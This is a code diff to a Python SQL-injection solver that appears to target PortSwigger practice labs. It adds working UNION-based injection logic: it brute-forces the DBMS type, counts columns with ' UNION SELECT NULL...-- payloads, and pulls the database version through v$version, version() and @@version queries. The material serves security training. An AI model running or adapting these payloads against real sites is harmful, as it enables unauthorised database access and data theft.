@@ -4,10 +4,11 @@ from rich.console import Console
 from rich.table import Table
 from rich import box 
 from rich import print
-import time
-import json
+import sys
+from halo import Halo
 
 from core.utils import RequestLab
+from core.utils import JSONPayloadSQLInjection
 
 
 class SQLInjectionBaseSolver(ABC):
@@ -20,30 +21,29 @@ class SQLInjectionBaseSolver(ABC):
         self.cookies = None
         self.csrf = None
         self.username = 'administrator'
-        self.dbms = None
-        self.json_data = None
-        self.json_dbms = self.get_list_dbms()
         self.categories = []
         self.categories_url = []
 
-        
-    def get_json_data(self):
-        """Read the JSON"""
-        path = '/mnt/project/ctf/portSwigger/AllFortSwigger/services/sql_injection/dbms.json'
-        with open(path, 'r') as file:
-            self.json_data = json.load(file)
-            file.close()
+        self.total_columns = None
+        self.data_type_columns = []
+        self.dbms = None
+        self.db_name = None
+        self.table_name = None
+        self.column_name = None
+
+        cls_json_payload = JSONPayloadSQLInjection()
+        self.json_payload = cls_json_payload.get_json_data()
+
+        self.spinner = Halo(spinner='dots')
     
-    def get_list_dbms(self):
-        """Return the list of DBMS."""
-        if self.json_data is None:
-            self.get_json_data()
-        return self.json_data['list_dbms']
 
     # This method quite's messy
-    def _request_lab(self, method='GET', data=None, cookies=None, allow_redirects=True):
+    def _request_lab(self, method='GET', url=None, data=None, cookies=None, allow_redirects=True):
         """Return the RequestLab object."""
-        request = RequestLab(self.url)
+
+        if url is None:
+            url = self.url
+        request = RequestLab(url)
         
         if method == 'GET':
             request.request_get()
@@ -73,39 +73,59 @@ class SQLInjectionBaseSolver(ABC):
     
     def _print_payload(self, payload):
         """Print the payload."""
-        self.console.print("Payload: ", payload)
-            
-    def _print_solved(self):
-        """Print the solved message."""
-        print(r"""[bold green]
-        .-------------------------------------.
-        |  ____   ___  _ __     _______ ____  |
-        | / ___| / _ \| |\ \   / / ____|  _ \ |
-        | \___ \| | | | | \ \ / /|  _| | | | ||
-        |  ___) | |_| | |__\ V / | |___| |_| ||
-        | |____/ \___/|_____\_/  |_____|____/ |
-        |                                     |
-        '-------------------------------------' [/bold green]
-""")
+        self.console.print("Payload: ", payload)        
         
     def determine_DBMS(self):
         """Determine the DBMS."""
-        for dbms in self.json_dbms:
+        self.spinner.start()
+        self.spinner.text = 'Determine the DBMS'
+        self._request_lab('GET')
+        self.set_category()
+        for dbms in self.json_payload:
             for query in dbms['list_command']:
                 url_brute = self.url + self.categories_url[1] + query
+                self._request_lab('GET', url_brute)
+                if self.html_content.status_code == 200:
+                    self.dbms = dbms['name']
+                    self.spinner.stop()
+                    self.console.log(f"[bold blue]DBMS:[/bold blue] {self.dbms}")
+                    return
+
 
     def determine_column_number(self):
         """Determine the number of columns."""
-        pass
-
-    def finding_data_type_column(self):
-        """Finding the data type of the column."""
-        pass
-
+        self.spinner.start()
+        self.spinner.text = 'Determine the number of columns'
+        # Try to find the number of columns using the UNION SELECT
+        for i in range(1, 100):
+            null = 'NULL,' * i
+            payload = f"' UNION SELECT {null[:-1]}--"
+            if self.dbms == 'ORACLE':
+                payload = f"' UNION SELECT {null[:-1]} FROM DUAL--"
+            url_brute = self.url + self.categories_url[1] + payload
+            self._request_lab('GET', url_brute)
+            if self.html_content.status_code == 200:
+                self.total_columns = i
+                self.spinner.stop()
+                self.console.log(f"[bold blue]Total Columns:[/bold blue] {self.total_columns}")
+                return
 
     def determine_DB_version(self):
         """Determine the DB version."""
-        pass
+        self.spinner.start()
+        self.spinner.text = 'Determine the DB version'
+        null = 'NULL,' * (self.total_columns-1)
+        if self.dbms == 'ORACLE':
+            payload = f"' UNION SELECT {null}banner FROM v$version--"
+        elif self.dbms == 'POSTGRESQL':
+            payload = f"' UNION SELECT {null}version()--"
+        else:
+            payload = f"' UNION SELECT {null}@@version--"
+        url_brute = self.url + self.categories_url[1] + payload
+        self._request_lab('GET', url_brute)
+        self.db_name = self.soup_html.find('h1').text
+        self.spinner.stop()
+        self.console.log(f"[bold blue]DB Name:[/bold blue] {self.db_name}")
 
     def retrieve_DB_name(self):
         """Retrieve the DB name."""
@@ -158,6 +178,19 @@ class SQLInjectionBaseSolver(ABC):
                 continue
             self.categories.append(category.text)
             self.categories_url.append(category['href'])
+
+    def _print_solved(self):
+        """Print the solved message."""
+        print(r"""[bold green]
+        .-------------------------------------.
+        |  ____   ___  _ __     _______ ____  |
+        | / ___| / _ \| |\ \   / / ____|  _ \ |
+        | \___ \| | | | | \ \ / /|  _| | | | ||
+        |  ___) | |_| | |__\ V / | |___| |_| ||
+        | |____/ \___/|_____\_/  |_____|____/ |
+        |                                     |
+        '-------------------------------------' [/bold green]
+""")
 
     @abstractmethod
     def build_payload():
